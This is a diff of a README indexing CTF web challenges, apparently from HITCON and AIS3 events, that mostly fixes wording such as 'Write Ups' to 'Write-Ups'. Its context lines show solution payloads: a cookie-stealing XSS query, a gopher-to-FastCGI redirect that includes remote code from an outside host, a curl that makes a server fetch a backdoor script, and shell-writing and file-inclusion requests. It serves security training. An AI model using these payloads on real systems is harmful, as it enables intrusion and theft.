@@ -5,12 +5,12 @@ This is the repository of all CTF challenges I made, including the source code, 
 Hope you like it :)  
 
 
-**P.s.** BTW, the `Babyfirst` series and `One Line PHP Challenge` are my favorite challenges. If you haven't enough time, please look them at least!
+**P.s.** BTW, the `Babyfirst` series and `One Line PHP Challenge` are my favorite challenges. If you haven't enough time, please look at them at least!
 
-* [Babyfirst](#babyfirst)  
-* [Babyfirst Revenge](#babyfirst-revenge)  
-* [Babyfirst Revenge v2](#babyfirst-revenge-v2)  
-* [One Line PHP Challenge](#one-line-php-challenge)  
+* [Babyfirst](#babyfirst)
+* [Babyfirst Revenge](#babyfirst-revenge)
+* [Babyfirst Revenge v2](#babyfirst-revenge-v2)
+* [One Line PHP Challenge](#one-line-php-challenge)
 
 <br>
 
@@ -95,7 +95,7 @@ http://13.231.137.9/cgi-bin/diag.cgi
 ```
 
 
-#### Write Ups
+#### Write-Ups
 
 * TBD
 
@@ -131,7 +131,7 @@ http://3.114.5.202/fd.php
 ?q=ssl。orange。tw?`%2b"%2bdocument[`cookie`];(`${`
 ```
 
-#### Write Ups
+#### Write-Ups
 
 * TBD
 
@@ -148,7 +148,7 @@ Tag:   **Environment Injection**, **MySQL Client Attack**
 #### Solution
 
 1. Buffer Overflow the `DB_HOST` in BSS
-2. Due to the [patch](hitcon-ctf-2019/gogo-powersql/Dockerfile#L20), we can pollute environment variable which are not in the [Blacklist](https://github.com/embedthis/goahead/blob/v4.0.0/src/cgi.c#L170).
+2. Due to the [patch](hitcon-ctf-2019/gogo-powersql/Dockerfile#L20), we can pollute environment variable which is not in the [Blacklist](https://github.com/embedthis/goahead/blob/v4.0.0/src/cgi.c#L170).
 3. Hijack MySQL connection by ENV such as `LOCALDOMAIN` or `HOSTALIAES`
 4. Read `/FLAG` by `LOAD DATA LOCAL INFILE`.
 
@@ -175,7 +175,7 @@ $ python main.py -F /FLAG
 
 
 
-#### Write Ups
+#### Write-Ups
 
 * TBD
 
@@ -213,7 +213,7 @@ http://54.250.242.183/luatic.php
 
 * Lua is so magic that there are several unintended solutions. Sorry for the imperfect challenge :(
 
-#### Write Ups
+#### Write-Ups
 
 * TBD
 
@@ -248,7 +248,7 @@ s = lambda x: quote(x.encode('ibm500'))
 print '%s=%s&x=%s' % (s('filename'), s('../../FLAG.txt', s('<x>'))
 ```
 
-#### Write Ups
+#### Write-Ups
 
 * TBD
 
@@ -274,7 +274,7 @@ P.S. This is a default installation PHP7.2 + Apache on Ubuntu 18.04
 * [exp_for_php.py](hitcon-ctf-2018/one-line-php-challenge/exp_for_php.py)
 * [Offical writeup for One Line PHP Challenge](http://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html)  
 
-#### Write Ups
+#### Write-Ups
 
 * [(English)One Line PHP Challenge](https://hackmd.io/s/B1A2JIjjm)  
 * [(中文)One Line PHP Challenge](https://hackmd.io/s/SkxOwAqiQ)  
@@ -309,7 +309,7 @@ http://13.230.134.135/
 
 * [exploit.phar](hitcon-ctf-2018/baby-cake/exploit.phar)
 
-#### Write Ups
+#### Write-Ups
 
 * [Baby Cake](https://github.com/PDKT-Team/ctf/tree/master/hitcon2018/baby-cake)  
 * [Hitcon 2018 Web - Oh My Raddit / Baby Cake 题解](https://xz.aliyun.com/t/2961)  
@@ -332,10 +332,10 @@ Tag:   **Observation**, **DES checksum**, **Crypto**, **Web**
 3. From the information above, it's reasonable to use `DES` in real world
 4. The most common block is `3ca92540eb2d0a42`(always in the cipher end). We can guess it's the padding `\x08\x08\x08\x08\x08\x08\x08\x08`
 5. Due to the checking parity in [DES](https://en.wikipedia.org/wiki/Data_Encryption_Standard), we can reduce the keyspace from 26(`abcdefghijklmnopqrstuvwxyz`) to 13(`acegikmoqsuwy`)
-    * Break in 1 second with `HashCat`
-    * Break in 10 minutes with single thread Python
+    * Break-in 1 second with `HashCat`
+    * Break-in 10 minutes with single thread Python
 
-#### Write Ups
+#### Write-Ups
 
 * [Oh My Raddit](https://github.com/pwning/public-writeup/blob/e818115a2c3a5d18e8191d37b5c3151823d43126/hitcon2018/oh-my-raddit/README.md)  
 * [Oh my raddit](https://github.com/mdsnins/ctf-writeups/blob/b292621463b156d864bd2db062f31afe9aacb8d6/HITCON%202018/Oh%20my%20raddit.md)
@@ -358,7 +358,7 @@ Tag:   **Web.py**,  **SQL Injection to RCE**
 
 * [exp.py](hitcon-ctf-2018/oh-my-raddit/exp.py)
 
-#### Write Ups
+#### Write-Ups
 
 * [Oh My Raddit V2](https://github.com/pwning/public-writeup/blob/c7273a8bd01710da0f2d9d9a3c8abe473b76bfde/hitcon2018/ohmyradditv2/README.md)
 * [Oh My Raddit v2](https://ctftime.org/writeup/11931)  
@@ -379,7 +379,7 @@ Tag:   **De-serialization**, **RCE**, **ASP.NET**, **View State**
 1. Get the `machineKey` in `web.config` by Server-Side-Includes(`.shtml` or `.stm`)
 2. Exploit `ASP.NET` `___VIEWSTATE` by [ysoserial.net](https://github.com/pwntester/ysoserial.net)
 
-#### Write Ups
+#### Write-Ups
 
 * [HITCON 2018: Why so Serials? Write-up](https://cyku.tw/ctf-hitcon-2018-why-so-serials/)  
 * [HITCON CTF 2018 - Why so Serials? Writeup](https://xz.aliyun.com/t/3019)  
@@ -432,7 +432,7 @@ http://host/?cmd=sh g
 You can check the [exploit.py](hitcon-ctf-2017/babyfirst-revenge/exploit.py) for the detail! And there are also lots of creative solutions, you can check the write ups below.
 
 
-#### Write Ups
+#### Write-Ups
 
 * [HITCON CTF 2017-BabyFirst Revenge-writeup](https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/)  
 * [HITCON CTF 2017-BabyFirst Revenge-writeup (Via curl)](http://www.jianshu.com/p/82788b6949c7)  
@@ -470,7 +470,7 @@ Tag:  **WhiteBox**, **PHP**, **Command Injection**
 You can check [exploit.py](hitcon-ctf-2017/babyfirst-revenge-v2/exploit.py) for the detail!
 
 
-#### Write Ups
+#### Write-Ups
 
 * [Baby First Revenge v2 (Via vim) by @bennofs](https://github.com/bennofs/docs/blob/master/hitcon-2017/baby-first-revenge2.md)  
 * [\[python\] baby-exp.py](https://codegists.com/snippet/python/baby-exppy_beched_python)  
@@ -509,7 +509,7 @@ $ curl http://host/?filename=URI/orange.pm&url=http://orange.tw/w/backdoor.pl
 $ curl http://host/?filename=xxx&url=orange://orange.tw
 ```
 
-#### Write Ups
+#### Write-Ups
 
 * [Another Solution by @Paul_Axe](https://twitter.com/Paul_Axe/status/927669724439293953)  
 * [HITCON 2017 SSRFme](https://ricterz.me/posts/HITCON%202017%20SSRFme)  
@@ -537,7 +537,7 @@ Tag:  **WhiteBox**, **MySQL**, **PostgreSQL**, **SQL Injection**, **Code Injecti
 
 * [exploit.py](hitcon-ctf-2017/sql-so-hard/exploit.py)  
 
-#### Write Ups
+#### Write-Ups
 
 * [SQL so Hard by @sorgloomer](https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md)  
 
@@ -577,7 +577,7 @@ $ curl -b cookie "http://host/?m=upload&url=phar:///var/www/data/$MD5_IP/&lucky=
 * [avatar.gif](hitcon-ctf-2017/baby^h-master-php-2017/avatar.gif)  
 * [fork.py](hitcon-ctf-2017/baby^h-master-php-2017/fork.py)
 
-#### Write Ups
+#### Write-Ups
 
 * [По умолчанию Чтение файлов => unserialize !](https://rdot.org/forum/showthread.php?t=4379)  
 
@@ -608,7 +608,7 @@ depth=0 C = TW, ST = Some-State, O = Internet Widgits Pty Ltd, CN = very-secret-
 $ curl -k  -H "host: very-secret-area-for-ctf.orange.tw" https://1.2.3.4/
 ```
 
-#### Write Ups
+#### Write-Ups
 
 * [HITCON 2016](https://dinhbaoluciusteam.wordpress.com/2016/10/10/hitcon-2016/)  
 * [HITCON CTF 2016: %%% (Web) Write-up](http://icheernoom.blogspot.tw/2016/10/hitcon-ctf-2016-web-write-up.html)  
@@ -640,7 +640,7 @@ $ while true; do curl 'http://1.2.3.4/?data=Buffer(1e4)' | grep -a hitcon; done;
 
 ```
 
-#### Write Ups
+#### Write-Ups
 
 * [Hello HitCon 2016 CTF](https://ctfs.ghost.io/hello-hitcon-2016-ctf/#leaking)  
 * [HITCON 2016 web 总结](http://0x48.pw/2016/10/14/0x24/)  
@@ -676,7 +676,7 @@ curl http://1.2.3.4/
 ?data=O:6:"HITCON":2:{s:14:"%00HITCON%00method";s:5:"login";s:12:"%00HITCON%00args";a:2:{i:0;s:7:"orÄnge";i:1;s:13:"babytrick1234";}}
 ```
 
-#### Write Ups
+#### Write-Ups
 
 * [Hitcon 2016 – Baby Trick](http://0xecute.com/index.php/2016/10/10/baby-trick/)
 * [Hello HitCon 2016 CTF](https://ctfs.ghost.io/hello-hitcon-2016-ctf/#babytrick)  
@@ -705,7 +705,7 @@ Tag: **GrayBox**, **Java**
 * [exploit.py](hitcon-ctf-2016/angry%20boy/exploit.py)
 * [decrpt.py](hitcon-ctf-2016/angry%20boy/decrypt.py)
 
-#### Write Ups
+#### Write-Ups
 
 * [Angry Boy - Web 300 Problem](https://github.com/pwning/public-writeup/tree/master/hitcon2016/web300-angryboy)
 
@@ -781,7 +781,7 @@ ccc: ls -alh
 
 * SESSION manipulation... seam SUCKS  
 
-#### Write Ups
+#### Write-Ups
 
 * [Web500 Hitconctf 2016 and exploit CVE-2013-2165](http://vnprogramming.com/index.php/2016/10/10/web500-hitconctf-2016-and-exploit-cve-2013-2165/)
 * [Angry Seam (500 pts)](https://github.com/Blaklis/write-ups/tree/master/hitcon)
@@ -846,7 +846,7 @@ http://localhost/
 And there are also lots of creative solutions, you can check the write ups below.  
 
 
-#### Write Ups
+#### Write-Ups
 
 * [babyfirst (web 100)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web100-babyfirst/writeup.md)  
 * [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)  
@@ -874,7 +874,7 @@ Tag: **GrayBox**, **C**, **PWN**
 
 * [exploit.py](hitcon-ctf-2015/nanana/exploit.py)  
 
-#### Write Ups
+#### Write-Ups
 
 * [nanana (pwn, web 200)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web200-nanana/writeup.md)  
 * [HITCON 2015 Quals: Nanana](https://kt.pe/blog/2015/10/hitcon-2015-quals-nanana/)  
@@ -899,7 +899,7 @@ Tag:  **WhiteBox**, **PHP**
 
     TBD
 
-#### Write Ups
+#### Write-Ups
 
 * [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)
 * [Giraffe's Coffee - Web 300 Problem - Writeup by Robert Xiao (@nneonneo)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web300-giraffes-coffee/readme.md)
@@ -914,7 +914,7 @@ Tag: **BlackBox**, **PHP**, **SSRF**
 
 #### Idea
 
-* Bypass SSRF restrictiton with 302 redirect  
+* Bypass SSRF restriction with 302 redirect  
 * Exploit FASTCGI protocol by using GOPHER  
 
 #### Source Code  
@@ -928,7 +928,7 @@ Tag: **BlackBox**, **PHP**, **SSRF**
 header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%00%00%00%01%04Zh%00%86%00%00%0E%03REQUEST_METHODGET%0F%0ASCRIPT_FILENAME/www/a.php%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%09%26PHP_VALUEauto_prepend_file%20%3D%20http%3A//orange.tw/x%01%04Zh%00%00%00%00%01%05Zh%00%00%00%00" );
 ```
 
-#### Write Ups  
+#### Write-Ups  
 
 * [HITCON CTF 2015 Web 100 Web 300 Writeup](http://5alt.me/posts/2015/10/HITCON%20CTF%202015%20Web%20100%20Web%20300%20Writeup.html)  
 * [Hitcon 2015 lalala web400 task](https://docs.google.com/document/d/1eALKwCyogM5Mw_D4qWe48X-PAGZw_2vT82aP0EPIr-8/mobilebasic?pli=1)  
@@ -956,7 +956,7 @@ Tag: **WhiteBox**, **PHP**, **UAF**, **PWN**
 
     TBD
 
-#### Write Ups
+#### Write-Ups
 
 * [Use-After-FLEE (pwn, web 500)](https://github.com/pwning/public-writeup/blob/master/hitcon2015/web500-use-after-flee/writeup.md)
 
@@ -980,7 +980,7 @@ Platform:  **BlackBox**, **PHP**, **H2**, **SQL Injection**
 
     TBD
 
-#### Write Ups
+#### Write-Ups
 
 * [HITCON CTF 2014: PUSHIN CAT](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/pushin-cat)
 * [HITCON CTF 2014 - PUSHIN CAT (H2 DB Insert SQL Injection)](https://www.youtube.com/watch?v=KNs5ZZo31P8)
@@ -1007,7 +1007,7 @@ Tag: **WhiteBox**, **Python**, **Collision**, **HPP**
 
     TBD  
 
-#### Write Ups  
+#### Write-Ups  
 
 * [HITCON CTF 2014: PY4H4SHER](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/py4h4sher)  
 * [HITCON CTF 2014: PY4H4SHER WRITEUP](http://blog.st3phn.com/2014/08/hitcon-ctf-2014-py4h4sher-writeup.html)  
@@ -1041,7 +1041,7 @@ $ curl http://1.2.3.4/admin/thefl4g.txt
 
 ```
 
-#### Write Ups  
+#### Write-Ups  
 
 * [HITCON CTF 2014: LEENODE](https://github.com/ctfs/write-ups-2014/tree/master/hitcon-ctf-2014/leenode)  
 * [(web) LEENODE [250]](http://cdepillabout.github.io/ctf/2014/hitcon/leenode/writeup.html)  
@@ -1057,7 +1057,7 @@ Tag: **GrayBox**, **PHP**, **JAVA**, **mod_jk**, **H2**, **SQL Injection**, **WA
 #### Idea  
 
 * Multilayered architecture vulnerability  
-* Default and up to date mod_jk leads to directory travesal  
+* Default and up to date mod_jk leads to directory traversal  
 * Bypass WAF by incorrect usage of BASE64 and URLENCODE  
 * SQL Injection on H2 Database  
 * Execute Code by using H2 SQL Injection  
@@ -1085,7 +1085,7 @@ Tag: **GrayBox**, **PHP**, **JAVA**, **mod_jk**, **H2**, **SQL Injection**, **WA
     $ curl "http://1.2.3.4/write_shell_here_=P/.a.php" -d 'phpinfo();'
     ```
 
-#### Write Ups  
+#### Write-Ups  
 
     TBD
 
@@ -1122,7 +1122,7 @@ Tag: **WhiteBox**, **PHP**, **SQL Injection**, **LFI**, **Race Condition**
    $ curl http://1.2.3.4/sqlpwn.php?mode=admin&boom=../../../../../../var/lib/php5/sess_243220
    ```  
 
-#### Write Ups  
+#### Write-Ups  
 
 * [AIS3 Final CTF Web Writeup (Race Condition & one-byte off SQL Injection)](http://blog.orange.tw/2015/09/ais3-final-ctf-web-writeup-race.html)  
 * [AIS3 CTF Final Web1 & Web2](https://docs.google.com/document/d/1n-8LHsxJ6o1-Pr1ISKYyopcfLoUIQcF5CcZGl7KLbPY/edit)  
